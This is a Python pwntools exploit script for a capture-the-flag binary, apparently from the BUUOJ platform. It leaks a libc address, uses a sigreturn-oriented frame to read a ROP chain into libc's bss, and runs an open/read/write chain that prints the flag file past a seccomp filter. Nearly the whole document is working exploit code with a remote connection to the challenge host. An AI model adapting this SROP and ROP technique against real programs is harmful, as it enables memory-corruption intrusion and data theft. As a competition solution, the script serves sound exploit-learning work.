# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    secommp: execve, fork ... goto 15 (sigreturn), so cant get shell 
    vuln: syscall(15LL); in sub_1347()
exp: SROP
1.leak libc address
2.sigreturn (sigframe[8:] for rsp+=0x8 when syscall) to read payload into libc.bss()
3.return to libc.bss() and execute the ROP chain ORW the flag
'''
from pwn import *


# define the context
binary_name = './vn_pwn_babybabypwn'
libc_name = './ubuntu16-libc-2.23-x64.so' if args.REMOTE \
        else '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6'
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 27409)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        brva 0x00000000000013BC
        c
    """, aslr=False)
else:
    io = process(binary_name)


# exploiting code
ru(b'my gift: ')
puts_addr = int(rl().strip(b'\n'), 16)
libc.address = puts_addr - libc.sym.puts
log.info(f'libc base: {hex(libc.address)}')

pop_rdi_addr = libc.address
pop_rsi_addr = libc.address
pop_rdx_addr = libc.address
pop_rdi_addr += 0x0000000000021102 if args.REMOTE else 0x0000000000021112
pop_rsi_addr += 0x00000000000202e8 if args.REMOTE else 0x00000000000202f8
pop_rdx_addr += 0x0000000000001b92 if args.REMOTE else 0x0000000000001b92

sigframe = SigreturnFrame()
sigframe.rdi = 0 # read(0, libc.bss(), 0x100)
sigframe.rsi = libc.bss() # read in flag string and ROP chain payload
sigframe.rdx = 0x100
sigframe.rip = libc.sym.read
sigframe.rsp = libc.bss() + 0x10 # after read() jump to libc.bss() + 0x10 the payload

payload = flat(
    b'flag'.ljust(0x10, b'\x00'),
    pop_rdi_addr, libc.bss(), # 'flag'
    pop_rsi_addr, 0,
    libc.sym.open, # open('flag', 0)
    pop_rdi_addr, 3, # fd
    pop_rsi_addr, libc.bss() + 0x400, # buf
    pop_rdx_addr, 0x100, # size
    libc.sym.read,
    pop_rdi_addr, 1, # fd
    pop_rsi_addr, libc.bss() + 0x400, # buf
    pop_rdx_addr, 0x100, # size
    libc.sym.write
)

sa(b'magic message: ', bytes(sigframe)[8:]) # rsp+=0x8 after sigreturn syscall
sl(payload)

# interact with the shell
io.interactive()
